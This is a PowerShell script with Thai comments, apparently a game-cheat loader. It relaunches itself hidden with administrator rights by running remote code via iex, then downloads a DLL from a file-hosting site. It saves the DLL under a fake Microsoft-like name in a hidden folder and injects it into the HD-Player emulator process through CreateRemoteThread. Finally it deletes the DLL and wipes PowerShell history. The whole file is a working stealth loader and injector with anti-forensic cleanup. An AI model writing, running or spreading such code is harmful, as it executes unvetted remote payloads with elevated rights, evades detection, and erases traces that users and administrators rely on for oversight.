# =========================================================
# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าไฟล์และการพรางตัว
# =========================================================
$url = "https://files.catbox.moe/0ukxya.dll" 
$fakeName = "mscories.dll" 
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$targetProcess = "HD-Player" 

# สร้างโฟลเดอร์ถ้ายังไม่มี
if (!(Test-Path $workDir)) { 
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
    attrib +h +s $workDir
}

# สุ่มชื่อไฟล์หรือเช็คเพื่อไม่ให้ชนกับไฟล์ที่ถูกล็อค (ไม่ต้องรีโปรแกรม)
$dllPath = Join-Path $workDir $fakeName
if (Test-Path $dllPath) {
    # ถ้าไฟล์เดิมโดนล็อค ให้สุ่มชื่อใหม่เพื่อดาวน์โหลดลงไปใหม่ได้
    $dllPath = Join-Path $workDir "ms_$(Get-Random).dll"
}

# =========================================================
# 3. ดาวน์โหลด DLL
# =========================================================
$ProgressPreference = 'SilentlyContinue'
try {
    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
} catch {
    exit # ถ้าโหลดไม่ได้ให้หยุดทำงาน
}

# =========================================================
# 4. C# Injector Code (คงเดิม)
# =========================================================
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# =========================================================
# 5. เริ่มการ Inject (หาโปรเซสที่เปิดอยู่แล้ว)
# =========================================================
$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue

if ($proc -and (Test-Path $dllPath)) {
    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
    # ถ้ามีหลายหน้าต่าง ให้ Inject ตัวแรกที่เจอ
    [Injector]::Inject($proc[0].Id, $dllPath)
}

# =========================================================
# 6. ล้างร่องรอย (Clean Up)
# =========================================================
Start-Sleep -Seconds 2

# พยายามลบไฟล์ (ถ้าลบไม่ได้เพราะถูก Inject อยู่ ก็ปล่อยไปเพื่อไม่ให้ Error)
Remove-Item $dllPath -Force -ErrorAction SilentlyContinue

Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }

exit